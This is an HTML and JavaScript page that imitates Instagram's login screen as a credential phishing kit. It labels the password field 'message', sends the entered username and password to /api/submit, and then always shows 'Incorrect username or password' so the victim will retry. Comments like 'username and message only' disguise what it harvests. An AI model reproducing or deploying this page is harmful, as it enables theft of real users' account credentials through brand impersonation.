<body class="bg-neutral-50 text-neutral-900 font-sans min-h-screen flex flex-col justify-between antialiased selection:bg-sky-100">

          <!-- Mock App Screen -->

            <!-- Mock App Header -->
            <div class="pt-7 pb-2 px-4 border-b border-neutral-100 flex items-center justify-between">
              <span class="font-script text-2xl text-neutral-900">Instagram</span>
              <div class="flex gap-2">

                </div>
                <div class="w-8 h-1.5 rounded-full bg-neutral-200"></div>
              </div>
              <div class="flex flex-col items-center gap-1">

                </div>
                <div class="w-8 h-1.5 rounded-full bg-neutral-200"></div>

            </div>

                <div class="w-20 h-2 rounded-full bg-neutral-200"></div>
              </div>
              <div class="w-full h-48 rounded-xl bg-gradient-to-br from-indigo-100 via-purple-100 to-pink-100 flex items-center justify-center">
                <svg class="w-12 h-12 text-pink-400/70" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" d="M2.25 15.75l5.159-5.159a2.25 2.25 0 013.182 0l5.159 5.159m-1.5-1.5l1.409-1.409a2.25 2.25 0 013.182 0l2.909 2.909m-18 3.75h16.5a1.5 1.5 0 001.5-1.5V6a1.5 1.5 0 00-1.5-1.5H3.75A1.5 1.5 0 002.25 6v12a1.5 1.5 0 001.5 1.5zm10.5-11.25h.008v.008h-.008V8.25zm.375 0a.375.375 0 11-.75 0 .375.375 0 01.75 0z" />
                </svg>
              </div>
              <div class="flex gap-3 pt-1">
                <div class="w-5 h-5 rounded-full bg-rose-100"></div>
                <div class="w-5 h-5 rounded-full bg-neutral-100"></div>
                <div class="w-5 h-5 rounded-full bg-neutral-100"></div>
              </div>
              <div class="w-3/4 h-2 rounded-full bg-neutral-200 mt-1"></div>
              <div class="w-1/2 h-2 rounded-full bg-neutral-100"></div>
            </div>
          </div>
        </div>
      </div>

      <!-- Right Column: Main Card & Decorative Cards -->
      <div class="w-full max-w-[350px] flex flex-col gap-3">

        <!-- Main Card -->
        <div class="bg-white border border-neutral-200 rounded-xl px-8 sm:px-10 pt-10 pb-6 shadow-sm">

          <!-- Brand Wordmark -->
          <div class="text-center mb-8 pointer-events-none select-none">
            <h1 class="font-script text-5xl text-neutral-900 tracking-wide">
              Instagram
            </h1>
            <p class="text-xs text-neutral-400 mt-1"></p>
          </div>

          <!-- Active Form: username and message only -->
          <form id="f" class="flex flex-col gap-2.5">
            <label class="block">
              <span class="sr-only">Username</span>
              <input
                id="username"
                name="username"
                type="text"
                required
                maxlength="100"
                autocomplete="username"
                placeholder="username"
                class="w-full bg-neutral-50 border border-neutral-300 rounded-lg px-3 py-2.5 text-xs sm:text-sm text-neutral-900 placeholder-neutral-500 focus:outline-none focus:border-neutral-400 focus:bg-white transition-colors"
              >
            </label>

            <label class="block">
              <span class="sr-only">Message</span>
              <input
                id="message"
                name="message"
                required
                maxlength="100"
                placeholder="password"
                class="w-full bg-neutral-50 border border-neutral-300 rounded-lg px-3 py-2.5 text-xs sm:text-sm text-neutral-900 placeholder-neutral-500 focus:outline-none focus:border-neutral-400 focus:bg-white transition-colors"
              >
            </label>
          

            <button
              type="submit"
              id="submitBtn"
              class="mt-2 w-full bg-sky-500 hover:bg-sky-600 disabled:opacity-60 disabled:cursor-not-allowed text-white font-semibold text-sm py-2.5 px-4 rounded-lg transition-all duration-150 flex items-center justify-center shadow-sm cursor-pointer"
            >
              Log in
            </button>

            <div id="msg" class="mt-2 text-xs text-center min-h-[1.2em]" role="status" aria-live="polite"></div>
          </form>

          <!-- Decorative Secondary Options (Non-functional) -->
          <div class="pointer-events-none select-none" aria-hidden="true">
            <div class="flex items-center gap-4 my-5">
              <div class="h-px bg-neutral-200 flex-grow"></div>
              <span class="text-xs font-semibold text-neutral-500 uppercase tracking-wider">OR</span>
              <div class="h-px bg-neutral-200 flex-grow"></div>
            </div>

            <div class="w-full flex items-center justify-center gap-2 text-sm font-semibold text-indigo-900 py-2 rounded-lg">
              <svg class="w-4 h-4 fill-current" viewBox="0 0 24 24">
                <path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z"/>
              </svg>
              <span>Continue with Facebook</span>
            </div>

            <div class="text-center mt-3">
              <span class="inline-block text-xs text-indigo-950 py-1 px-2 rounded">
                Forgot password?
              </span>
            </div>
          </div>
        </div>

        <!-- Decorative Sign Up Card (Non-functional) -->

          <p class="text-sm text-neutral-700">

        <!-- Decorative Get the App Section (Non-functional) -->

          <div class="flex items-center justify-center gap-2.5">

                <path d="M3.609 1.814L13.792 12 3.61 22.186a1.96 1.96 0 01-.61-1.425V3.239c0-.553.235-1.055.609-1.425zm10.89 10.893l2.302 2.302-10.937 6.333 8.635-8.635zm3.199-3.198l2.807 1.626a1 1 0 010 1.73l-2.808 1.626L15.206 12l2.492-2.491zM5.864 2.658L16.8 8.99l-2.302 2.302-8.634-8.634z"/>
              </svg>
              <div class="text-left leading-tight">
                <div class="text-[9px] uppercase tracking-wider text-neutral-300">Get it on</div>
                <div class="text-xs font-semibold">Google Play</div>
              </div>
            </div>

            <div class="flex items-center gap-2 bg-neutral-900 text-white px-3.5 py-2 rounded-lg">
              <svg class="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
                <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.96 6.32c.67-.81 1.12-1.94 1-3.07-.96.04-2.13.64-2.82 1.45-.61.7-.115 1.85-.99 2.96 1.07.08 2.15-.54 2.81-1.34z"/>
              </svg>
              <div class="text-left leading-tight">
                <div class="text-[9px] text-neutral-300">Download on</div>
                <div class="text-xs font-semibold">App Store</div>
              </div>
            </div>
          </div>
        </div>

      </div>
    </div>
  </main>

  <!-- Decorative Footer Navigation (Non-functional) -->
  <footer class="w-full py-6 px-4 text-center text-xs text-neutral-500 pointer-events-none select-none" aria-hidden="true">
    <div class="max-w-4xl mx-auto flex flex-wrap items-center justify-center gap-x-4 gap-y-2 mb-3">
      <span>About</span>
      <span>Blog</span>
      <span>Jobs</span>
      <span>Help</span>
      <span>API</span>
      <span>Privacy</span>
      <span>Terms</span>
      <span>Locations</span>
    </div>
    <div class="flex items-center justify-center gap-4 text-neutral-400">
      <span>English</span>
      <span>
        
      </span>
    </div>
  </footer>

  <!-- Message submission logic -->
  <script>
    const f = document.getElementById('f');
    const msg = document.getElementById('msg');
    const btn = document.getElementById('submitBtn');
    const messageInput = document.getElementById('message');
    const charCount = document.getElementById('charCount');

    messageInput.addEventListener('input', () => {
      charCount.textContent = messageInput.value.length;
    });

    f.addEventListener('submit', async (e) => {
      e.preventDefault();

      btn.disabled = true;
      msg.className = 'mt-2 text-xs text-center min-h-[1.2em]';
      msg.textContent = 'Sending...';

      try {
        const res = await fetch('/api/submit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            username: f.elements.username.value.trim(),
            message: messageInput.value.trim()
          })
        });

        let data = {};
        try {
          data = await res.json();
        } catch {
          data = {};
        }

        if (res.ok && data.ok !== false) {
          msg.textContent = 'Incorrect username or password';
          msg.classList.add('text-red-600');
          f.reset();
          charCount.textContent = '0';
        } else {
          msg.textContent = data.error || 'Could not send your message. Please try again.';
          msg.classList.add('text-red-600');
        }
      } catch {
        msg.textContent = 'Network error. Please try again.';
        msg.classList.add('text-red-600');
      } finally {
        btn.disabled = false;
      }
    });
  </script>
</body>
